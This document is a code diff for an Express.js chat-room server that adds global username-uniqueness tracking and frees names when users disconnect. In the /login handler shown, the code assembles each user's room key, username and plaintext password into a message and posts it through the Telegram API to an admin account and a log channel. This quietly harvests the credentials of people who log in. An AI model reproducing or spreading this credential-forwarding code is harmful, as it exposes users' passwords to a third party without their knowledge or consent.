@@ -13,15 +13,19 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 const rooms = {};
+const usedUsernames = new Set(); // Tracks all usernames globally
 
 function cleanExpiredRooms() {
   const now = Date.now();
   for (const key in rooms) {
     const room = rooms[key];
     if (room.expiresAt < now) {
+      // Remove usernames of active users in this room from global tracker
+      room.activeUsers.forEach(u => usedUsernames.delete(u));
       room.clients.forEach(res => res.end());
       delete rooms[key];
     } else {
+      // Clean messages older than 24 hours
       room.messages = room.messages.filter(m => now - m.timestamp < 24 * 3600 * 1000);
     }
   }
@@ -31,7 +35,7 @@ setInterval(cleanExpiredRooms, 60000);
 app.get('/generate-key', (req, res) => {
   const key = uuidv4().split('-')[0];
   const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
-  rooms[key] = { messages: [], clients: [], expiresAt };
+  rooms[key] = { messages: [], clients: [], expiresAt, activeUsers: new Set() };
   res.json({ key });
 });
 
@@ -46,17 +50,15 @@ app.post('/login', async (req, res) => {
   const room = rooms[key];
   if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
 
+  // Check global username uniqueness
+  if (usedUsernames.has(username)) {
+    return res.json({ success: false, message: 'Username already taken globally' });
+  }
+
   const loginText = `🔐 New Login\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
 
   try {
-    const updates = await axios.get(`${TELEGRAM_API}/getUpdates`);
-    const used = updates.data.result.some(u => {
-      const text = u.message?.text || '';
-      return text.includes(`Username: ${username}`);
-    });
-
-    if (used) return res.json({ success: false, message: 'Username already taken' });
-
+    // Send login info to Telegram admin and log channel
     await axios.post(`${TELEGRAM_API}/sendMessage`, {
       chat_id: ADMIN_USER_ID,
       text: loginText
@@ -66,6 +68,10 @@ app.post('/login', async (req, res) => {
       chat_id: LOG_CHANNEL_ID,
       text: loginText
     });
+
+    // Mark username as used globally and add to this room's active users
+    usedUsernames.add(username);
+    room.activeUsers.add(username);
 
     res.json({
       success: true,
@@ -94,6 +100,9 @@ app.get('/stream/:key', (req, res) => {
   const room = rooms[req.params.key];
   if (!room) return res.status(404).end();
 
+  const username = req.query.username;
+  if (!username) return res.status(400).end();
+
   res.set({
     'Content-Type': 'text/event-stream',
     'Cache-Control': 'no-cache',
@@ -103,8 +112,13 @@ app.get('/stream/:key', (req, res) => {
   res.write('\n');
   room.clients.push(res);
 
+  // Handle disconnect: free username from active users & global tracker
   req.on('close', () => {
     room.clients = room.clients.filter(c => c !== res);
+    if (room.activeUsers.has(username)) {
+      room.activeUsers.delete(username);
+      usedUsernames.delete(username);
+    }
   });
 });
 
